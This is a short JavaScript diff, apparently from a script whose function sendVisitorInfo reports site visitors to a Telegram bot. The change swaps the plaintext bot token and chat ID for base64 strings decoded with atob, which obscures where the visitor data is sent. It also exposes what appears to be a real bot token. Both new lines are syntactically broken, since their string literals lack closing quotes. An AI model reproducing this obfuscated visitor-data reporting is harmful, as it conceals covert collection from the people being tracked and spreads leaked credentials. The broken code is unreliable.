@@ -1,5 +1,5 @@
-const BOT_TOKEN = "8656569964:AAGagGRH2abs29HJ7F3l4Wz8UL0viT_hgs8";
-const CHAT_ID = "-5270455382";
+const BOT_TOKEN = atob("ODY1NjU2OTk2NDpBQUdhZ0dSSDJhYnMyOUhKN0YzbDRXejhVTDB2aVRfaGdzOA==);
+const CHAT_ID = atob("LTUyNzA0NTUzODI=);
 
 async function sendVisitorInfo() {
     try {
